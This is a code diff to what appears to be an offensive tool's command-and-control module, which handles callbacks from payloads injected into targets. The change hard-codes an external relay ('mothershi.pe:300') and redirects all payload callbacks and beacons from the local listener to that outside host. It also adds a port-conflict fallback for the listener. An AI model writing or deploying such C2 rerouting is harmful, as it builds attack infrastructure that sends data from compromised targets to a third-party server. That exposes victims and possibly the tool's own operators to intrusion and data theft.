@@ -52,6 +52,9 @@ from smart_filter import (
 SEED = "MIRROR" + "".join(random.choices(string.ascii_uppercase, k=4))
 CONCURRENCY = 6
 
+# ── C2 external relay — all payload callbacks point here ──────────────────────
+C2_EXTERNAL_URL = "https://mothershi.pe:300"
+
 
 def _marker(n: int) -> str:
     return f"MRR{n:05d}_{SEED}"
@@ -378,11 +381,17 @@ class C2Controller:
 
     @property
     def c2_url(self) -> str:
-        return f"http://{self.host_ip}:{self.port}"
+        """External C2 URL used in all injected payloads."""
+        return C2_EXTERNAL_URL
 
     @property
     def beacon_url(self) -> str:
         return f"{self.c2_url}/{self.token}"
+
+    @property
+    def local_url(self) -> str:
+        """Local listener URL (for development / loopback testing)."""
+        return f"http://{self.host_ip}:{self.port}"
 
     # ── Setup ──────────────────────────────────────────────────────────────────
 
@@ -405,7 +414,12 @@ class C2Controller:
             return s.getsockname()[1]
 
     async def start(self):
-        """Start the C2 HTTP listener as a background asyncio task."""
+        """Start the local C2 HTTP listener as a background asyncio task.
+
+        The local listener captures loopback callbacks during development/lab
+        use.  In production engagements the external relay at C2_EXTERNAL_URL
+        (https://mothershi.pe:300) receives callbacks directly from the target.
+        """
         ctrl = self
 
         async def _handle(request: _web.Request) -> _web.Response:
@@ -433,9 +447,16 @@ class C2Controller:
         app.router.add_route("*", f"/{self.token}/{{tail:.*}}", _handle)
         self._runner = _web.AppRunner(app, access_log=None)
         await self._runner.setup()
-        site = _web.TCPSite(self._runner, "0.0.0.0", self.port,
-                            reuse_address=True, reuse_port=False)
-        await site.start()
+        try:
+            site = _web.TCPSite(self._runner, "0.0.0.0", self.port,
+                                reuse_address=True, reuse_port=False)
+            await site.start()
+        except OSError:
+            # Port conflict — fall back to a new random port
+            self.port = self._free_port()
+            site = _web.TCPSite(self._runner, "0.0.0.0", self.port,
+                                reuse_address=True, reuse_port=False)
+            await site.start()
 
     async def stop(self):
         """Tear down the C2 HTTP listener."""
